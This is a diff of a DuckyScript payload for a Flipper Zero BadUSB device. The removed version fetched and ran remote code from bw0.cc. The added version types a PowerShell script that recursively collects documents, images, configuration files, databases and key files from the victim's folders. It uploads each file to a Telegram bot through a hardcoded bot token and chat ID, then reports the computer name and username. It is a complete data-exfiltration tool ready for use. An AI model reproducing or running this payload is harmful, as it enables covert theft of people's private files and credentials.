@@ -1,19 +1,78 @@
+REM Flipper Zero - Complete File Scanner
+REM Scans ALL user folders and sends files to Telegram
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
+DELAY 400
 ENTER
+DELAY 1000
 
+REM 1. Start message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Full%20System%20Scan%20Started"
+ENTER
+DELAY 2000
+
+REM 2. PowerShell script to scan ALL folders
+STRING powershell -c "
+`$bot = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$chat = '6614794141'
+`$baseUrl = 'https://api.telegram.org/bot' + `$bot
+
+# ALL user folders to scan
+`$allFolders = @(
+    [Environment]::GetFolderPath('Desktop'),
+    [Environment]::GetFolderPath('MyDocuments'),
+    [Environment]::GetFolderPath('MyMusic'),
+    [Environment]::GetFolderPath('MyPictures'),
+    [Environment]::GetFolderPath('MyVideos'),
+    [Environment]::GetFolderPath('UserProfile') + '\\Downloads',
+    [Environment]::GetFolderPath('UserProfile') + '\\OneDrive',
+    [Environment]::GetFolderPath('UserProfile') + '\\Desktop',
+    [Environment]::GetFolderPath('UserProfile') + '\\Documents',
+    [Environment]::GetFolderPath('UserProfile') + '\\Pictures',
+    [Environment]::GetFolderPath('UserProfile') + '\\Videos',
+    [Environment]::GetFolderPath('UserProfile') + '\\Music',
+    `$env:USERPROFILE + '\\Desktop',
+    `$env:USERPROFILE + '\\Documents',
+    `$env:USERPROFILE + '\\Downloads',
+    `$env:USERPROFILE + '\\Pictures',
+    `$env:USERPROFILE + '\\Videos',
+    `$env:USERPROFILE + '\\Music',
+    `$env:USERPROFILE + '\\OneDrive',
+    `$env:TEMP
+)
+
+# File types to collect
+`$fileTypes = @('*.txt', '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.jpg', '*.jpeg', '*.png', '*.log', '*.cfg', '*.conf', '*.ini', '*.json', '*.xml', '*.csv', '*.sql', '*.db', '*.cer', '*.key')
+
+`$totalFound = 0
+`$totalSent = 0
+
+foreach (`$folder in `$allFolders) {
+    if (Test-Path `$folder -ErrorAction SilentlyContinue) {
+        foreach (`$type in `$fileTypes) {
+            `$files = Get-ChildItem -Path `$folder -Filter `$type -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
+            foreach (`$file in `$files) {
+                `$totalFound++
+                if (`$file.Length -lt 20MB) {
+                    try {
+                        curl.exe -s -F `"chat_id=`$chat`" -F `"document=@`$(`$file.FullName)`" `"`$baseUrl/sendDocument`"
+                        `$totalSent++
+                        Start-Sleep -Milliseconds 500
+                    } catch {
+                        # Silent error handling
+                    }
+                }
+            }
+        }
+    }
+}
+
+# Send summary
+`$summary = `"Scan Complete`nFound: `$totalFound files`nSent: `$totalSent files`nPC: `$env:COMPUTERNAME`nUser: `$env:USERNAME`"
+curl.exe `"`$baseUrl/sendMessage?chat_id=`$chat&text=`$summary`"
+"
+DELAY 500
+ENTER
